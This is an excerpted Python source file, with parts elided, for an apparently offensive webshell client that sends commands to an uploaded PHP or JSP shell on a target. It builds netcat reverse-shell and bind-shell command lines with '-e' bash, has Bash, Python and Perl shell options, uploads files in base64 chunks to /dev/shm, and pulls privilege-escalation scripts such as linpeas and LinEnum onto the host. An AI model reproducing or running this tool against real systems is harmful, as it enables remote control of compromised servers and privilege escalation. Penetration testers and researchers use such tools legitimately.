...
class WebShell(object):
    ...
    def __init__(self):
        ...
        self.thread = threading.Thread(
            target=self.ReadThread, args=(lambda: self.stop_threads,)
        )
    ...
    def SetParameter(self, option, value):
        ...
        if option == "lhost":
            ...
            if value in RevShells:
                ...
                print(
                    "[ERROR] Wrong ReverseShell version, use 'Bash', 'Python', 'Netcat' or 'Perl'\n"
                )
            ...
            if value in BindShells:
                ...
                print(
                    "[ERROR] Wrong BindShell version, use 'Python', 'Netcat' or 'Perl'\n"
                )
        else:
    ...
    def RevShell(self):
        ...
        if self.lhost == "127.0.0.1":
            ...
            if self.revshell == "bash":
                print(
                    f"[*] Starting ReverseShell with Bash to {self.lhost} on port {self.lport}\n"
                )
            ...
            # Python reverse shell
                ...
                if self.pyversion:
                    ...
                    self.GetProg("python")
                print(
                    f"[*] Starting ReverseShell with {self.pyversion} to {self.lhost} on port {self.lport}"
                )
            ...
            # NetCat reverse shell
                ...
                if self.ncversion:
                    ...
                    self.GetProg("netcat")
                print(
                    f"[*] Starting ReverseShell with {self.ncversion} to {self.lhost} on port {self.lport}"
                )
                RevShellFormat = (
                    f"""{self.ncversion} {self.lhost} {self.lport} -e {self.BASH} &"""
                )
                self.WriteCmd(RevShellFormat)
            # Perl reverse shell
            elif self.revshell == "perl":
                print(
                    f"[*] Starting ReverseShell with Perl to {self.lhost} on port {self.lport}\n"
                )
    ...
    def BindShell(self):
        ...
        if self.bindshell == "netcat":
            ...
            BindShellFormat = (
                f"""{self.ncversion} -nlvp {self.lport} -e {self.BASH} &"""
            )
        ...
        # Python bind shell
            ...
            if self.pyversion:
                ...
                self.GetProg("python")
                print(
                    f"[*] Starting BindShell with {self.pyversion} on port {self.lport}"
                )
    ...
    def UploadCmd(self, upload, stream=False, name="dummy"):
        ...
        for index, chunk in enumerate(chunk_array):
            print(
                f"[*] Uploading chunk {(index) +1} of {len(chunk_array)} from {filename} in progress...",
                end="\r",
                flush=True,
            )
            upload_file = (
                f"{self.ECHO} -n {chunk} >> {self.working_path}/{filename}.gz~b64"
            )
    ...
    def WriteCmd(self, cmd, fifo=True):
        b64cmd = base64.b64encode("{}\n".format(cmd.rstrip()).encode("utf-8")).decode(
            "utf-8"
        )
        if fifo:
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        ...
        action="store",
        metavar="",
        help="http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]",
    )
    parser.add_argument(
        "-p",
        action="store",
        metavar="",
        default="cmd",
        help="The parameter of the uploaded webshell which executes the command [default=cmd]",
    )
    parser.add_argument(
        "-m",
        action="store",
        metavar="",
        default="POST",
        help="HTTP method to use for requests [GET, POST; default=POST]",
    )
    parser.add_argument(
        "-P",
        action="store",
        metavar="",
        default="",
        help="Proxy to use for requests [http(s)://host:port]",
    )
    ...
    group.add_argument(
        ...
        metavar="",
        default="127.0.0.1",
        help="Your local listening IP address if you use the ReverseShell option",
    )
    group.add_argument(
        "-lport",
        action="store",
        metavar="",
        default="9001",
        help="Your local listening TCP port if you use the Bind- or ReverseShell option",
    )
    group.add_argument(
        "-revshell",
        action="store",
        metavar="",
        default="Bash",
        help="Kind of ReverseShell [Bash, Python, Perl; default=Bash]",
    )
    group.add_argument(
        "-bindshell",
        action="store",
        metavar="",
        default="Python",
        help="Kind of BindShell [Python, Netcat, Perl; default=Python]",
    )
    group.add_argument(
        "-speed",
        action="store",
        metavar="",
        default="fast",
        help="Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]",
    )
    group.add_argument(
        "-path",
        action="store",
        metavar="",
        default="/dev/shm",
        help="Default {__progname__} working path; Change it to /tmp if /dev/shm is not available",
    )
            ...
            if Option == "?":
                ...
                if len(CustomInput) >= 3:
                    ...
                    if param == "-m":
                        if module == "upgrade":
                            S.UpgradeShell()
                        elif module == "revshell":
                            S.RevShell()
                        elif module == "bindshell":
                            S.BindShell()
                        else:
                ...
                if len(CustomInput) == 2:
                    ...
                    if param == "-m":
                        if module == "linpeas":
                            module_url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
                        elif module == "exploit-suggester":
                            module_url = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
                        elif module == "linenum":
                            module_url = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
                        else:
                            print(f"[ERROR] {module} is no valid module")
                            S.Help("Upload")
